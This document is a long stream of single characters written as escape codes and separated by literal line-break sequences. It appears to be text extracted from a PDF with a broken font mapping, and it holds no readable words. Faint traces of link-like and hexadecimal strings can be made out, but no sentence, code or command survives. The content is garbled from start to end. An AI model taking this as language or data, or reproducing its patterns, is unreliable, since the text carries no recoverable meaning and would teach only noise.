2\n>\n0\n\u00b3\n\u00c7\nt\n\ufb02\n\u00fa\nH\n\u00bc\n\ufb02\n\u00c7\n0\n>\nH\nH\n\ufb02\n\u00fa\nH\n\u00c7\n\u00fa\nH\n\u00fa\n>\nt\n>\n\u00e2\n>\n\u00fa\n\u2030\n\u00f6\n>\n0\n\u00c7\nH\n\u00c7\n\u00f6\n\ufb02\n\u2030\n\ufb02\n\u00b1\n\ufb02\n\u00fa\n;\n\ufb02\n\u00c7\n\u00fa\nH\n\ufb02\n0\n\ufb02\n;\nH\n;\n>\n\u00fa\n\u2030\nT\n;\n\ufb02\n\u00b1\n\u2021\nT\n;\nH\n\u00f6\n~\n>\n\u2021\n\u00db\n\u2030\n0\n;\nP\n\u00bc\n\u00c7\n\u00e2\n\ufb02\n\u2030\n\ufb02\n\u00b1\n\ufb02\n\u00fa\n;\n\ufb02\n\u2021\n\u00fa\nH\n0\n>\n\u2021\nH\n0\n;\n>\n\u00fa\n\u2030\n>\n\u2021\n>\n\u2030\n\ufb02\n\u00f6\n\u00c7\n\u2021\n0\n\ufb02\n;\n\ufb02\n>\n0\n\u2021\n\u00bc\n\u2021\n\ufb02\n\u00fa\nH\n\ufb02\n0\n;\nw\n\u00c7\nH\n\u00bc\n\u00f6\n\u00c7\n\u00e2\n\u00c7\nH\n>\n0\n\u2021\nH\n\u00c7\n\ufb02\n;\n;\n\u00bc\nT\n\u00e2\n\u2030\n>\n\u00e2\nw\n>\n\u2021\n;\n~\n\ufb02\n\u2021\n\u00b3\n\u00fa\n\u00c7\n\u201c\n>\n\u00fa\nH\n\u00b1\nH\n\u00bc\n\ufb02\n,\nH\n\ufb02\n\u00fa\nH\n\u00c7\n>\n\u00e2\n\u00b1\n0\n\u2021\n\u2021\n~\n\ufb02\n0\n>\nH\nH\n>\n\u2021\n\u00db\n;\n0\n\u00b3\n>\n\u00fa\n\u00c7\n\u201c\n>\nH\n\u00c7\n\u00fa\n;\n\u00b1\n\u00c7\nH\nH\n\u00c7\n\u00fa\n\u00b3\nH\n\u00bc\n\ufb02\n\u00c7\n0\nH\n>\n0\n\u00b3\n\ufb02\nH\n\u00c7\n\u00fa\n\u00b3\n,\n0\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n;\n;\n\u00bc\nT\n\u00e2\n\u2030\n~\n\ufb02\n\ufb02\n;\n,\n\ufb02\n\u2021\n\u00c7\n>\n\u00e2\n\u00e2\n\u2021\nw\n>\n0\n\u2021\n\u00b1\n\u00e2\n\ufb02\n\u00b3\n\u00c7\nH\n\u00c7\n\u00f6\n>\nH\n\ufb02\n\u00f8\n\u00e2\n\u00db\n\u00c7\n\u00fa\n\u00b3\n~\nT\nH\nT\n\u00fa\n;\n\u00e2\n\u00c7\n\u2021\n\u00c7\nH\n\ufb02\n\u2030\n\ufb02\n\u00f6\n>\n\u00c7\n\u00e2\n;\n\u00b1\n0\n\u00f6\nT\nH\n;\n\u00c7\n\u2030\n\ufb02\n\ufb02\n\u00fa\nH\n\u00c7\nH\n\u00c7\n\ufb02\n;\n,\n,\n0\n,\n0\n\u00c7\n>\nH\n\ufb02\n\u00e2\n>\n\u2021\n\ufb02\n0\n\ufb02\n\u2030\n\u2030\n\ufb02\n\u00b1\n\ufb02\n\u00fa\n;\n\ufb02\n;\n>\nH\nH\n\u00bc\n\ufb02\n\u00b1\n\u00c7\n0\n\ufb02\nw\n>\n\u00e2\n\u00e2\n\ufb02\n\u00f6\n>\n\u00c7\n\u00e2\n\u00b3\n>\nH\n\ufb02\nw\n>\n\u2021\n>\n\u00fa\n\u2030\n\ufb02\n\u00fa\n\u2030\n,\n\u00c7\n\u00fa\nH\n\u2021\n>\n\u00fa\n>\n\u00e2\n\u00e2\n\u00bc\n\ufb02\n\u00e2\n,\n,\n0\n\ufb02\nt\n\ufb02\n\u00fa\nH\nH\n\u00bc\n\ufb02\n\u00db\n\u00c7\n\u00fa\n\u2030\n;\n\u00b1\n\u00e2\n>\nH\n\ufb02\n0\n>\n\u00e2\n\u00f6\nt\n\ufb02\n\u00f6\n\ufb02\n\u00fa\nH\nw\n\ufb02\n\u00bc\n>\nt\n\ufb02\n~\n;\n\ufb02\n0\nt\n\ufb02\n\u2030\nw\n\u00c7\nH\n\u00bc\nH\n\u00bc\n\u00c7\n;\n>\n\u2021\nH\n0\n>\n;\nw\n\ufb02\n\u00e2\n\u00e2\n>\n;\nH\n\u00bc\n\ufb02\n\u2021\n\u00f6\n,\n0\n\u00f6\n\u00c7\n;\n\ufb02\n>\n\u00fa\n\u2030\n>\n~\nT\n;\n\ufb02\n\u00b1\n;\n\u2021\n;\nH\n\ufb02\n\u00f6\n;\nt\n\u00c7\n>\nw\n\u00bc\n\u00c7\n\u2021\n\u00bc\nH\n\u00bc\n\u00c7\n;\n\u00b3\n0\nT\n,\n\ufb02\n,\n>\n\u00fa\n\u2030\n;\n\u00c7\nH\n;\n>\nH\nH\n>\n\u2021\n\u00db\n;\nT\n0\n\u00b1\n>\n\u2021\n\ufb02\nH\nH\n\u00bc\n\ufb02\n0\n0\n\u00b3\n>\n\u00fa\n\u00c7\n\u201c\n>\nH\n\u00c7\n\u00fa\n;\n\u00ff\n\ufb02\n\u00b1\n\ufb02\n0\n\ufb02\n\u00fa\n\u2021\n\ufb02\n;\n\u00ec\n\u00bb\n\u00ed\n\u00bc\nH\nH\n,\n;\n\u00f3\n\u00f3\nw\nw\nw\n\u00b1\n\u00c7\n0\n\ufb02\n\ufb02\n\u2021\n\ufb02\n\u2021\n\u00f6\n\u00f3\n~\n\u00e2\n\u00b3\n\u00f3\nH\n\u00bc\n0\n\ufb02\n>\nH\n\u00f8\n0\n\ufb02\n;\n\ufb02\n>\n0\n\u2021\n\u00bc\n\u00f3\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f3\n\u00b9\n\u00c5\n\u00f3\n\u201c\n\ufb02\n0\n\u00f8\n\u2030\n>\n\u2021\n\u00f8\nT\n;\n\ufb02\n\u2030\n\u00f8\nH\n\u00f8\n\u2030\n\u00c7\n;\nH\n0\n\u00c7\n~\nT\nH\n\ufb02\n\u00f8\n\u00b1\n\u00c7\n\u00fa\n;\n,\n\u2021\n\u00bc\nH\n\u00f6\n\u00e2\n\u00ec\n\u00bc\n\u00ed\n\u00bc\nH\nH\n,\n;\n\u00f3\n\u00f3\nH\nw\n\u00c7\nH\nH\n\ufb02\n0\n\u2021\n\u00f6\n\u00f3\n\u00a7\n>\n\u00f6\n\ufb02\n;\n2\n\u00c7\n\u00fa\nH\n\u00bc\n\ufb02\n2\n~\n\u00f3\n;\nH\n>\nH\nT\n;\n\u00f3\n\u00c4\n\u00c5\n\u00bd\n\u00c0\n\u00bc\n\u00c0\n\u00be\n\u00c5\n\u00bd\n\u00b9\n\u00c0\n\u00c5\n\u00c3\n\u00c4\n\u00c4\n\u00c4\n\u00b9\n\u00b9\n\u00ec\n\u00bd\n\u00ed\n\u00bc\nH\nH\n,\n;\n\u00f3\n\u00f3\n\u00e2\n>\n~\n;\n~\n\u00e2\n\u00b3\n\u00b1\n\u00f8\n;\n\ufb02\n\u2021\nT\n0\n\ufb02\n\u2021\n\u00f6\n\u00f3\n\u00bc\n\u00b9\n\u00bb\n\u00c1\n\u00f3\n\u00b9\n\u00c4\n\u00f3\n\u00b9\n\u00be\n\u00f3\n\u00fa\n>\n\u00fa\n\u00bc\n>\n\u00c7\n;\n\u00bc\nT\n\u00f8\n0\n>\nH\n\u00c7\n\u00fa\n\u00b3\n\u00f8\nH\n\u00bc\n\ufb02\n\u00f8\n;\nT\nH\n\u00bc\n\u00f8\n\u2021\n\u00bc\n\u00c7\n\u00fa\n>\n\u00f8\n;\n\ufb02\n>\n\u00f3\n\u00ec\n\u00be\n\u00ed\n\u00bc\nH\nH\n,\n;\n\u00f3\n\u00f3\n\u2021\n\u00f6\n\u00f6\nT\n\u00fa\n\u00c7\nH\n\u2021\n;\n,\n\u00c7\n\u2021\n\ufb02\nw\n0\n\u00db\n;\n\u2021\n\u00f6\n\u00f3\nH\n,\n\u00c7\n\u2021\n\u00f3\n\u00bb\n\u00b9\n\u00bc\n\u00c4\n\u00c5\n\u00bd\n\u00c1\n\u00f8\n;\nH\n\ufb02\n>\n\u00e2\nH\n\u00bc\n\u2021\n\u00f8\n\u2021\n\u2021\n~\n\ufb02\n0\n\ufb02\n;\n,\n\u00c7\n\u00fa\n>\n\u00b3\n\ufb02\n\u00f8\n\u2021\n>\n\u00f6\n,\n>\n\u00c7\n\u00b3\n\u00fa\n\u00f8\n>\nH\nH\n>\n\u2021\n\u00db\n;\n\u00f8\nw\n\u00c7\nH\n\u00bc\n\u00f8\n;\n\u2021\n\u00c7\n>\n\u00e2\n\u00f8\n\ufb02\n\u00fa\n\u00b3\n\u00c7\n\u00fa\n\ufb02\n\ufb02\n0\n\u00c7\n\u00fa\n\u00b3\n\u00ec\n\u00c0\n\u00ed\n\u00bc\nH\nH\n,\n\u00f3\n\u00f3\n~\n\u00e2\n\u00b3\nH\n0\n\ufb02\n\u00fa\n\u2030\n\u00f6\n\u00c7\n\u2021\n0\n\u2021\n\u00f6\n\u00f3\nH\n0\n\ufb02\n\u00fa\n\u2030\n\u00e2\n>\n~\n;\n\u00f8\n;\n\ufb02\n\u2021\nT\n0\n\u00c7\nH\n\u2021\n\u00f8\n\u00c7\n\u00fa\nH\n\ufb02\n\u00e2\n\u00e2\n\u00c7\n\u00b3\n\ufb02\n\u00fa\n\u2021\n\ufb02\n\u00f3\n\u00f6\nT\n;\n\ufb02\nt\n\ufb02\n0\n\u00f8\nH\n\u00e2\n>\n0\n\u2030\n\u00f8\n\u00b3\nH\n\u00db\n\u00c7\nH\n\u00f3\n\u00ec\n\u00c1\n\u00ed\n\u00bc\nH\nH\n,\n;\n\u00f3\n\u00f3\nw\nw\nw\n\u2021\n>\n0\n~\n\u00fa\n~\n\u00e2\n>\n\u2021\n\u00db\n\u2021\n\u00f6\n\u00f3\n\u00bc\n\u00b9\n\u00bb\n\u00c1\n\u00f3\n\u00b9\n\u00be\n\u00f3\n\u00bc\n\u00c4\n\u00f3\nH\n\u00bc\n0\n\ufb02\n>\nH\n\u00f8\n>\n\u2030\nt\n\u00c7\n;\n0\n\u2021\n\u00f8\n;\n/\nT\n\u00c7\n~\n\u00e2\n\u2021\n\u2030\n\u00f8\n\u2021\n\u00fa\nH\n\u00c7\n\u00fa\nT\n\ufb02\n;\n\u00f8\nH\n0\n\ufb02\n\u00fa\n\u2030\n\u00f8\n\u00b1\n\u00f8\n>\nH\nH\n>\n\u2021\n\u00db\n\ufb02\n0\n;\n\u00f8\nT\n;\n\u00c7\n\u00fa\n\u00b3\n\u00f8\n\u00fa\n>\nH\n\u00c7\nt\n\ufb02\n\u00f8\n;\n\u00f8\nH\n\u00e2\n;\n\u00f8\nH\n\u00f8\n\u00e2\n\u00c7\nt\n\ufb02\n\u00f8\n\u00b1\n\u00b1\n\u00f8\nH\n\u00bc\n\ufb02\n\u00f8\n\u00e2\n>\n\u00fa\n\u2030\n\u00f3\n\u00fa\n\u2030\n\u00c7\n\u2021\n>\nH\n0\n;\n\u00b1\n4\n\u00f6\n,\n0\n\u00f6\n\u00c7\n;\n\ufb02\n\u00ea\n\u00c9\n4\n;\n\u00eb\n\u00c9\n4\n\u00c9\n4\n\u02d9\n\u2021\n,\n\ufb02\n=\n\ufb02\n;\n\u2021\n0\n\u00c7\n,\nH\n\u00c7\n\u00fa\n\u2021\n\u2030\n\u00b1\n\u00c1\n\ufb02\n\u00bc\n\ufb02\n\u00c5\n\u00bc\n\u00c4\n>\n\u00c4\n\u00c5\n\u2021\n~\n~\n\u00c4\n\u00c0\n\u00c3\n\ufb02\n\u00c1\n\u00c4\n\u00c4\n\u00b9\n\u00c0\n\u00c0\n>\n\u00bc\n\u00c0\n\ufb02\n\u00bd\n\u00c3\n>\n\u00c4\n\u2030\n\u00c4\n~\n\u00c4\n~\n\u00c5\n\u00b9\n\u00c0\n\u00bd\n\u00b9\n~\n\u2030\n\u00c0\n\u00bc\n\u2021\n\u00c4\n\u00c0\n\u00be\n\u00c4\n\u00b1\n~\n\u00c0\n\u00be\n\u00be\n\u00b1\n\u00c1\n\u00c1\n\u00b1\n\u00bb\n\u00b1\nu\n\u00bc\n\u00c0\n\u00c1\n\u00ff\n\ufb02\n;\nT\n\u00f6\n\ufb02\n0\nH\n\u00b1\n\ufb02\n,\n\u00e2\n\u00c7\nH\n\u00c7\n\u00fa\n\u00b3\n4\nM\nF\n\u00f8\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f8\n\u00c4\n\u00c3\n\u00c0\n\u00c5\n\u00ea\n\ufb02\n,\n\u00bb\n\u00c5\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00eb\n\u2021\n\u00c3\n\u00b1\n>\n\u00c1\n\u00b1\n\u00bc\n\u00c3\n\ufb02\n\u2021\n\u00be\n\u00b1\n\u00be\n\u00bb\n\u00be\n\u00bc\n>\n\ufb02\n\u00c0\n\u00c5\n\u00bb\n\u00b1\n\u00bc\n\u2030\n\u2030\n\u00c3\n\u2021\n\u00c1\n\u00bd\n\u2030\n\u00b9\n\u00be\n\u00c1\n\u00be\n\u00bd\n\u00bb\n\u00c5\n\u00be\n\u00c0\n\u00b1\n\u00b9\n\u00bd\n\u2021\n\u00c4\n\u00c3\n\u2030\n~\n\ufb02\n\u2030\n\u00c4\n\u00c4\n\u2030\n\u00c3\n\u00c5\n\u00b1\n\u00c0\n\u00c0\n\u00bb\n\u00c4\n\u00b9\n>\n\u00be\n\u00c1\n\u2030\nu\n\u00bc\n\u00c0\n\u00c1\n\u00ff\n\u00b0\n&\n2\nj\n\u00c7\n\ufb02\n\u00e2\n\u2030\n\u00b0\n\u00b3\n2\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f8\n\u00b9\n\u00c4\n\u00f8\n\u00bc\n\u00bb\n\u2030\n\u2021\n\ufb02\n,\n\u00e2\n\u00c7\nH\n\u00c7\n\u00fa\n\u00b3\n4\nM\nF\n\u00f8\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f8\n\u00c4\n\u00c3\n\u00c0\n\u00c5\n\u00ea\n\ufb02\n,\n\u00bb\n\u00c5\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00eb\n\u00b1\nH\n,\n\u00f3\n\u00f3\n\u00bb\n\u00c4\n\u00c0\n\u00bb\n\u00b9\n\u00c1\n\u00bb\n\u00bc\n\u00b9\n\u00ec\n\u00ed\n\u00bc\n\u00b9\n\u00c1\n\u00f3\n,\nT\n~\n\u00f3\n0\n\ufb02\n>\n\u2030\n\u00f6\n\ufb02\nH\nH\n&\n\u00ff\n\u00b0\n\u00ff\n\ufb02\n;\nT\n\u00f6\n\ufb02\n0\nH\n\u00b1\n\u2030\nw\n\u00fa\n\u00e2\n>\n\u2030\n\u00c7\n\u00fa\n\u00b3\n;\n\u2021\n0\n\u00c7\n,\nH\n;\n\u00ea\n\ufb02\n,\n\u00bb\n\u00c5\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00eb\n\u00bc\n,\n\u00f3\n\u00f3\n\u00bb\n\u00c4\n\u00c0\n\u00bb\n\u00b9\n\u00c1\n\u00bb\n\u00bc\n\u00b9\n\u00ec\n\u00ed\n\u00bc\n\u00b9\n\u00c1\n\u00f3\n\u00b1\n>\nt\n\u00c7\n\u2021\n\u00fa\n\u00c7\n\u2021\n&\n\u00ff\n\u00b0\n\u00ff\n\ufb02\n;\nT\n\u00f6\n\ufb02\n0\nH\n\u00b1\n\u2030\nw\n\u00fa\n\u00e2\n>\n\u2030\n\u00c7\n\u00fa\n\u00b3\n;\n\u2021\n0\n\u00c7\n,\nH\n;\n\u00ea\n\ufb02\n,\n\u00bb\n\u00c5\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00eb\n\u00bd\n\u00c5\n\u2021\n\u00c5\n\u00c0\n\u00bc\n\u2021\n\u00c3\n\ufb02\n\u00bb\n\u00be\n~\n\u00c1\n~\n\ufb02\n\u00c0\n>\n\u00c5\n\u2021\n~\n\u00bb\n~\n\ufb02\n\u00bd\n\u00b1\n\u00b9\n\u00c0\n\ufb02\n>\n\u00b1\n>\n\u00bc\n\u00bc\n\ufb02\n\u00bb\n\u00bb\n\u00bb\n\u00c0\n\u00c4\n\u00b9\n\u00c1\n\ufb02\n\u00c5\n\u00bc\n\u00c3\n\u00b1\n\u00be\n\ufb02\n\u00bc\n\u2030\n\u2021\n\u00c4\n\u00c0\n\u2030\n\u00c1\n\u00b9\n\u00c5\n~\n\u2021\n\u00b9\n\ufb02\n~\n\u00bd\n\u00c1\nu\n\u00bc\n\u00c0\n\u00c1\nj\n>\nt\n\u00c7\n\u2021\n\u00fa\n\u00c7\n\u2021\n\u00ea\n\ufb02\n,\n\u00bb\n\u00c5\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00eb\n\u00c0\n\u00c4\n\u00c1\n\u00b9\n\u2030\n\u2030\n\u2021\n\u00be\n\u00bc\n\u00c4\n\u00b1\n\u00b1\n>\n\u00c5\n\u00b9\n\u00b9\n\u00bc\n\u00c0\n\u00c4\n\u00bc\n\u00b9\n\u00c3\n\ufb02\n\u00c5\n\u2021\n\u00bd\n\u00c4\n\u00c0\n\u00b1\n\u00c4\n\u00be\n\u00bd\n>\n\u00bd\n\u00be\n\u00c3\n\u00bc\n\u00b1\n\u00bc\n\u00b1\n~\n\u00b1\n\u00bc\n\u00c0\n\u00bc\n\u2030\n\u00bc\n\u00b1\n\u00c1\n\u00bd\n\u00c0\n\u00c3\n\u2030\n\u00be\n\u00c0\n\u00c4\n\u00c1\n\u00be\n\u00c1\n\u2021\n\u00b1\n\u00bd\n\u00c1\n\u00bc\nu\n\u00bc\n\u00c0\n\u00c1\n4\n~\n>\n\u00e2\nH\nH\n0\n\u00c7\n\u00db\n\ufb02\n\u00ea\n\ufb02\n,\n\u00bb\n\u00c5\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00eb\n\u2021\n\ufb02\n\u2030\n\u00c3\n\u2021\n>\n\u00c5\n\u00c1\n\u00bc\n\u00c0\n\u00c0\n\u00be\n\u00bd\n\u2030\n\u00bd\n\u2030\n\u00bd\n\u2030\n\u00b9\n\u00c5\n\u00b1\n\u00c3\n\u00b9\n\u00bc\n\u00bc\n\u00bd\n\u2021\n\u2021\n\u00bb\n\u00c5\n\u00b1\n\u00b9\n\u2030\n\u00c5\n\u00c5\n\ufb02\n\u00bc\n\u00bb\n\u00c3\n\u00c5\n\u00bc\n\u00c4\n\u00c0\n\u00be\n\u00be\n\u00c0\n\u00bc\n\u2030\n\u00b1\n\u00c0\n~\n>\n\u00c4\n\u00be\n~\n\u00bd\n>\n\u00c0\n\u00c5\n\u2030\n\u00bb\n\u00c3\n~\n\u00c4\nu\n\u00bc\n\u00c0\n\u00c1\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00b9\n\u00c3\n\u00bc\n\u00b9\n2\n\u00b1\n\u00c7\n\u00fa\n>\n\u00e2\n2\n,\n\u00f6\n2\n>\n,\n,\n\u00f8\n\u00bc\n\u2030\n\u2021\n\u00ea\nT\n\u00b3\nT\n;\nH\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00eb\n=\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\n\u00bc\n>\n;\n\u00bc\n\u00ea\nT\n\u00b3\nT\n;\nH\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00eb\n\u00bd\n\u00b9\n\u00c0\n\u00b1\n\u00bd\n\u00bd\n\u00bb\n~\n\u00b1\n~\n\u00bb\n\ufb02\n\u00c5\n\u00c3\n\u00b9\n\u00bc\n\u00c4\n\u00b1\n\u00c4\n\u2021\n\u00c5\n\u00bc\n\u2021\n~\n\u2021\n~\n\u00bb\n\u2030\n\u00b1\n\u00b1\n\u00bc\n\u00c3\n\u00be\n\u00bb\n\u2030\n\u2021\n\u2030\n\u2030\n>\n\u2021\n\u2021\n\u00c3\n\u00c1\n\u00c4\n\u00be\n\u00bd\n\ufb02\n\u00c1\n\u00c0\n\u00b1\n\u00c5\n~\n\u00bb\n\ufb02\n\u2021\n\u00c0\n>\n\u00c1\n\u00c1\n\u00b1\n\u00c0\n\u00bc\n~\n\u2021\nu\n\u00bc\n\u00c0\n\u00c1\n\u00fb\nT\n~\n\u00e2\n\u00c7\n;\n\u00bc\n\ufb02\n0\n\u00bc\n>\n;\n\u00bc\n\u00ea\nT\n\u00b3\nT\n;\nH\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00eb\n~\n\u00b1\n\u2021\n\u00c0\n\u2021\n\u00c1\n\u00c4\n\u00bb\n\u00c3\n\u00b1\n\u00b1\n\u00bc\n\u2021\n\u2021\n\u00be\n\u00b1\n\u00bd\n\u2021\n\u2030\n\u00be\n\u00b9\n\u00b1\n\u00c1\n\u00be\n\u00c5\n\ufb02\n\u00bb\n\u00b9\n\u2021\n\u2021\n\u00c5\n>\n\ufb02\n\u00bb\n\ufb02\n\u00c0\n\u00bc\n\u00bb\n\u00bd\n\u00c5\n\u00b1\n\u00bd\n\u00c0\n\u00b1\n\u2030\n\u2030\n\u2030\n~\n\u2030\n\u00bd\n\u00bc\n\u2021\n~\n\u00be\n\u2030\n\u00bc\n\u00bc\n\u00bb\n\u00bd\n\u00c1\n\u00c4\n\u00c5\n\u00bc\n\u00bc\nu\n\u00bc\n\u00c0\n\u00c1\n\u00ba\n\u2021\n\u00db\n=\n\u00e2\n\u00e2\n\u00bd\n\u00bc\n\u00f8\n~\n\u00c7\nH\n\u00ea\nT\n\u00b3\nT\n;\nH\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00eb\n \u00c4\n\u00b9\n~\n\u00c5\n\u00bd\n\u00bb\n>\n~\n\u00bb\n\u00c3\n\u00c5\n\u00c4\n\u2030\n\u00c3\n\u2030\n\u00c4\n>\n\u00c4\n\u2030\n\u00c1\n\u00bd\n\u00be\n\u00bb\n\u00bb\n\u00c4\n\u00c1\n\u00bb\n\u2021\n\ufb02\n\ufb02\n\u00b9\n\u00c3\n\ufb02\n\u00bd\n\u00bb\n~\n~\n\u00c5\n>\n\u00c1\n\u00c4\n\u00b1\n\u00c0\n\u00c5\n\u00c0\n\u00b1\n\u00c0\n\u00c3\n\u00c5\n\ufb02\n\u00bb\n\u00bb\n\u2030\n\u00bd\n\u00c4\n\u00bb\n\u00c3\n\u2021\n\u00b1\n\u2021\n\u00be\n>\n\u2021\n>\nu\n\u00bc\n\u00c0\n\u00c1\n\u00ba\n\u2021\n\u00db\n=\n\u00e2\n\u00e2\n\u00bd\n\u00bc\n\u00f8\n~\n\u00c7\nH\n\u00ea\nT\n\u00b3\nT\n;\nH\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00eb\n\u00bb\n\u00be\n\u00c1\n>\n>\n\u00c5\n>\n\u00b9\n\ufb02\n\u2021\n\u00b9\n\u00bb\n\u00bd\n>\n>\n\u00c0\n~\n\u2030\n~\n>\n\u00c5\n\ufb02\n>\n\u00c5\n\u2030\n\u00bc\n\u00c5\n\u00b1\n\u00c0\n\u00c5\n\u2030\n\u00be\n\u00c4\n\u2030\n\u00be\n\u00bd\n~\n\u2021\n\u00bb\n\u00c3\n\u2021\n\u00c1\n>\n\u00bc\n\u00b9\n~\n\u00c3\n\u00be\n~\n~\n\u00c4\n\u2021\n\u00c0\n\u00bc\n\u00bb\n\u2030\n~\n~\n\u00c0\n~\n\u2021\n\u00c1\n\u00b1\n\u00be\nu\n\u00bc\n\u00c0\n\u00c1\n\u00b3\n0\n\ufb02\n\ufb02\n\u00fa\n\u2030\n\u2030\n\u2030\n\ufb02\n=\n\u00e2\n\u00e2\n\u00ea\nT\n\u00b3\nT\n;\nH\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00eb\n\u00be\n\u00b9\n\u00bc\n\u00c5\n~\n\u00be\n\u00bd\n\u2021\n\u00c3\n\u00b1\n\ufb02\n~\n\u2030\n\u00b9\n\u00c0\n\ufb02\n\u00c4\n~\n\u00b1\n\u00b9\n\u00bb\n\u00bd\n\u2021\n\u00bb\n\u00b9\n\u00bc\n\u00bc\n\u00bc\n\u00be\n\u00be\n>\n>\n>\n\u00bc\n\u00bd\n\u00c4\n\u00bd\n\u00be\n\u00bb\n\u2021\n>\n\u00be\n\u00be\n~\n~\n\u2021\n\ufb02\n\u00bc\n\u00bc\n\u00c0\n\u00b9\n\u00c1\n\u00c1\n\u00c3\n\u00c1\n\u00bb\n\u00be\n\u2021\n\u00bb\n>\n\u00be\n\u00c5\n\u00bd\n\u00bc\nu\n\u00bc\n\u00c0\n\u00c1\n\u00bc\n\u00b9\n\u00bb\n\u00be\n\u2021\n\u2021\n\u00f6\n,\n\u00e2\n\u00c7\n;\n\u00bc\n\u00f6\n\ufb02\n\u00fa\nH\n;\n\u00fa\n,\nT\nH\n\u02d9\n\ufb02\n\u00f6\n,\n\u00e2\n>\nH\n\ufb02\n\u00e2\n;\n\u00ea\n=\n\ufb02\n\u2021\n\ufb02\n\u00f6\n~\n\ufb02\n0\n\u00bc\n\u00b9\n\u00bb\n\u00be\n\u00eb\n\u00bc\n,\n\u00f3\n\u00f3\nw\nw\nw\nt\n\u00c7\nH\n>\n\u00f6\n\u00c7\n\u00fa\n\u00f6\n>\n\u00c7\n\u00fa\n\u00ec\n\u00ed\n\u00c7\n\u00fa\n\u00b1\n&\n\u00ff\n\u00b0\n\u00c9\n0\n\u201c\n;\n\ufb02\n\u2021\n\u00fa\n\u2030\n>\n0\n\u2021\n4\n\u00bc\n\u00ea\n=\n\ufb02\n\u2021\n\ufb02\n\u00f6\n~\n\ufb02\n0\n\u00bc\n\u00b9\n\u00bb\n\u00be\n\u00eb\nF\n\u02d9\n>\n\u00fa\n\u2030\nF\n\u02d9\n\u00fb\n\u00ff\n\u00c9\nT\n0\n\u00c7\n\u2021\n>\nH\n>\n\u00f3\n\u00fa\n0\nH\n4\nt\n\ufb02\n0\n>\n\u00b3\n\ufb02\n\u00bc\n\u00b9\n\u00bc\n\u00be\n\u00bb\n\u00c5\n\u00bc\n\u00f4\nF\n\u02d9\nF\nW\n\u00fb\n\u00b0\n\u00c9\n\u02d9\n\u00fb\n;\n;\n\u00c7\n~\n\u00e2\n\ufb02\n4\nM\nF\n\u00f8\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f8\n\u00b9\n\u00bb\n\u00c5\n\u00c5\nu\n\u02d9\n\u00fa\n~\nT\n\u00fa\n\u2030\n\u00bc\n\u00b9\n\u00bc\n\u00be\n\u00bb\n\u00c5\n\u00c1\n\u00f4\nF\n\u02d9\nP\nF\n0\n2\n4\n\u00b0\nF\n\u00be\n\u02d9\nu\n\u02d9\nj\n\u00c7\n\u00e2\n\ufb02\n\u2021\n\u00fa\nH\n>\n\u00c7\n\u00fa\n\u00c7\n\u00fa\n\u00b3\nP\n;\n\u2021\n0\n\u00c7\n,\nH\n\u00bc\n\ufb02\n\u00e2\n\u00e2\n4\n>\n\u00e2\n\u00e2\n\u00f8\n\u00fb\nH\n\ufb02\n\u00fa\nH\n\u00c7\n>\n\u00e2\n4\nM\nF\n\u00f8\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f8\n\u00b9\n\u00bb\n\u00c5\n\u00c5\n\u00bc\n\u00b9\n\u00bc\n\u00bc\n\u00c0\n\u00bc\n\u00b9\n\u00f4\nF\n\u02d9\n\u00fb\n\u00c9\n\u00b0\n4\nZ\n\u00fb\n;\n;\n\u00c7\n~\n\u00e2\n\ufb02\nu\n\u02d9\n,\n,\n\u00e2\n\u00c7\n\u2021\n>\nH\n\u00c7\n\u00fa\n=\nw\n\u00fa\n\u00e2\n>\n\u2030\n\u00bc\n\u00b9\n\u00bc\n\u00be\n\u00bb\n\u00c5\n\u00c3\n\u00f4\nF\n\u02d9\n4\n&\n\u00ff\n\u00ff\nF\n\u00be\n\u02d9\n2\nF\nM\nF\n\u00be\n\u02d9\n&\n\u00fb\n4\n\u00c9\n&\n\u00ba\nW\n\u00ba\n\u00b0\nu\n\u02d9\n\u02d9\n\u00fb\n=\n\u00b0\n\u00b1\nu\n\u02d9\n\u00ea\n\u00c9\n~\n;\n\ufb02\n0\nt\n\ufb02\n\u2030\n\u00c7\n\u00fa\n4\nM\nF\n\u00f8\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f8\n\u00b9\n\u00bb\n\u00c5\n\u00c5\n\u00eb\n\u00bc\n\u00b9\n\u00bc\n\u00be\n\u00be\n\u00be\n\u00c5\n\u00f4\nF\n\u02d9\n4\n&\n\u00ff\n\u00ff\nF\n\u00be\n\u02d9\n2\nF\nM\nF\n\u00be\n\u02d9\n&\n\u00fb\n4\n\u00c9\n&\n\u00fb\n;\n;\n\u00c7\n~\n\u00e2\n\ufb02\n4\nM\nF\n\u00f8\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f8\n\u00b9\n\u00bb\n\u00c5\n\u00c5\nF\n\u00c3\n\u00f3\n\u00be\n4\n\u00db\n\u00c7\n\ufb02\n\u00f3\n\u00ff\n\ufb02\n\u00b1\n\ufb02\n0\n\ufb02\n0\nu\n\u02d9\n\u2030\n\u00e2\n\u00bc\n\u00c4\n\u00bb\n\u00be\n\u00b9\n\u00bb\n\u00bd\n\u00f4\nF\n\u02d9\n\u00fb\n\u00ff\n\u00c9\n\u02d9\n\u00ff\n\u00c9\n\u00a7\n\u00be\n\u00ba\n\ufb02\nH\n\ufb02\n0\n,\n0\n\ufb02\nH\n\ufb02\n0\n0\n\u00c9\nH\n\u00bc\n\ufb02\n0\n\u00ff\n\ufb02\nt\n\u